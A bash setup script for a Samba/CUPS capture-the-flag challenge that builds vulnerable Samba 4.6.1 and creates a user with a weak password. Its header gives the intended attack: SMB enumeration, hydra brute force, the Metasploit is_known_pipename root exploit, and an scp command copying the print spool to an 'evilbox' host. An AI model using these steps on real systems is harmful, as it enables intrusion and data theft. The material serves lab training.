#####################################################################
#
# Challenge: PC LOAD LETTER
# Author: Jack Sullivan
# Tested on: Ubuntu 16.04.1 - 16.04.5
# Flag: "Gangsta Collator"
#
# Steps:
#   1) Enumerate user "milton" via SMB.
#        $ nmap -p139,445 --script smb-enum-users $TARGET
#   2) Scan for vulnerabilities (based on Samba version).
#        $ nmap --script smb-vuln-cve-2017-7494 \
#          --script-args smb-vuln-cve-2017-7494.check-version \
#          $TARGET
#   3) Brute force Milton's account, LMv2 dialect.
#      Best to use a password spray to find common passwords first.
#        $ hydra -l milton -p fire -m "local lmv2" smb://$TARGET
#   4) Exploit CVE-2017-7497 to get a root shell.
         # msfconsole -q
#        msf> use exploit/linux/samba/is_known_pipename
#        msf exploit(linux/samba/is_known_pipename) > set RHOST <target>
#        msf exploit(linux/samba/is_known_pipename) > set SMBUSER milton
#        msf exploit(linux/samba/is_known_pipename) > set SMBPASS fire
#        msf exploit(linux/samba/is_known_pipename) > run
#        ...
#        id
#        uid=0(root) gid=0(root) groups=0(root)
#   4) Copy the print spool back to attacker box by some means.
#        scp -r /var/spool/cups user@evilbox:/ctf/files/
#   5) Sift through the data files and find the flag in Milton's airline ticket.
#
#
# Extra: anonymous printing to the server.
#   1) Connect to the share and print.
#        $ smbclient \\\\172.16.94.135\\PDF -c "print myfile.jpg"
#   2) Printing goes to /dev/null, but it clutters up the queue,
#      making the flag harder to find. ;)
#
#
# References:
#   - https://wiki.samba.org/index.php/Setting_up_Samba_as_a_Print_Server
#   - https://superuser.com/questions/304670/how-to-add-a-fake-dummy-null-printer-in-cups#326226
#   - https://www.computerhope.com/unix/smbclien.htm
#   - http://omatic.musicairport.com/
#
#####################################################################

DEBUG=0


# Absolute path of CWD.
THIS_SCRIPT=`readlink -f $0`
THIS_PATH=`dirname $THIS_SCRIPT`


function mkuser {
  N_USER="$1"
  N_PASS="$2"
  N_NAME="$3"

  echo "[*] Creating user: $N_USER : $N_PASS : $N_NAME"

  # Create regular user.
  sudo useradd --create-home --shell /bin/bash --groups sambashare --comment "$N_NAME" $N_USER

  # Set regular user's password to something that can be brute forced.
  echo -e "$N_PASS\n$N_PASS" | sudo passwd $N_USER

  # Create regular user in samba.
  echo -e "$N_PASS\n$N_PASS" | sudo /usr/local/samba/bin/smbpasswd -a $N_USER
  sudo /usr/local/samba/bin/smbpasswd -e $N_USER
}


# Update to latest.
echo "[*] Upgrading to latest packages."
sudo apt update
sudo apt upgrade -y


# Install and configure firewall packages.
sudo DEBIAN_FRONTEND=noninteractive apt install -yq iptables-persistent
sudo ip6tables -F
sudo ip6tables -P INPUT DROP
sudo ip6tables -P OUTPUT DROP
sudo ip6tables -P FORWARD DROP
sudo bash -c "ip6tables-save > /etc/iptables/rules.v6"

sudo iptables -F
sudo iptables -P INPUT DROP
sudo iptables -A INPUT -i lo -j ACCEPT
sudo iptables -A INPUT -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 139 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 445 -j ACCEPT
sudo bash -c "iptables-save > /etc/iptables/rules.v4"

# Install Samba dependencies.
sudo DEBIAN_FRONTEND=noninteractive apt-get install -qy acl attr \
  autoconf bind9utils bison build-essential \
  debhelper dnsutils docbook-xml docbook-xsl flex gdb libjansson-dev krb5-user \
  libacl1-dev libaio-dev libarchive-dev libattr1-dev libblkid-dev libbsd-dev \
  libcap-dev libcups2-dev libgnutls28-dev libjson-perl \
  libldap2-dev libncurses5-dev libpam0g-dev libparse-yapp-perl \
  libpopt-dev libreadline-dev nettle-dev perl perl-modules pkg-config \
  python-all-dev python-crypto python-dbg python-dev python-dnspython \
  python3-dnspython python-gpgme python3-gpgme python-markdown python3-markdown \
  python3-dev xsltproc zlib1g-dev liblmdb-dev lmdb-utils \
  libgpgme11-dev
sudo ln -s /usr/bin/python2.7 /usr/bin/python
sudo ln -s /usr/bin/python3.5 /usr/bin/python3


# Get, build, and install vulnerable Samba 4.6.1.
sudo apt install -y git make cups cups-pdf
git clone https://github.com/samba-team/samba $HOME/samba
pushd $HOME/samba
git fetch
git checkout samba-4.6.1
./configure
make
sudo make install
popd


# Configure Samba.
sudo bash -c "getent group sambashare || groupadd sambashare"
sudo cp $THIS_PATH/conf/smb.conf /usr/local/samba/etc/smb.conf
sudo cp $THIS_PATH/conf/cupsd.conf /etc/cups/
sudo cp $THIS_PATH/conf/cups-pdf.conf /etc/cups/

# Create share paths.
sudo mkdir -p /srv/share/{accounting,sales,marketing,engineering,facilities,human_resources}
sudo chgrp -R sambashare /srv/share/*
sudo chmod 770 /srv/share/*
sudo mkdir -p /var/spool/samba
sudo chmod 1777 /var/spool/samba/
sudo mkdir -p /var/lib/samba/printers
sudo chmod 770 /var/lib/samba/printers


# Create users.
LONG_PASS="jjfklsdahf87ehw87oyrf87d78fshfuisejkhlrkjehfdohf87wehofi"
mkuser "peter" "$LONG_PASS" "Peter Gibbons"
mkuser "michael" "$LONG_PASS" "Michael Bolton"
mkuser "samir" "$LONG_PASS" "Samir Nagheenanajar"
mkuser "bill" "$LONG_PASS" "Bill Lumbergh"
mkuser "tom" "$LONG_PASS" "Tom Smykowski"
mkuser "bob1" "$LONG_PASS" "Bob Porter"
mkuser "bob2" "$LONG_PASS" "Bob Slydell"
mkuser "dom" "$LONG_PASS" "Dom Portwood"
mkuser "milton" "fire" "Milton Waddams"


# Restart CUPS
echo "[*] Restarting CUPS"
sudo systemctl restart cups

# Start Samba
echo "[*] Starting the SMB service, smbd."
sudo /usr/local/samba/sbin/smbd

# Make Samba persist on reboot.
sudo bash -c 'echo "/usr/local/samba/sbin/smbd" >> /etc/rc.local'
sudo chmod 744 /etc/rc.local


# Print files
for filename in `ls $THIS_PATH/print_files`; do
  echo "[*] Printing file: $filename";
  /usr/local/samba/bin/smbclient -U milton%fire \
    //localhost/PDF \
    -c "print $THIS_PATH/print_files/$filename";
done


# Clean up the evidence.
#if [ $DEBUG == 0 ]; then
#  echo "[*] Cleaning up files in $THIS_PATH"
#  sudo rm -rf $THIS_PATH/*
#fi
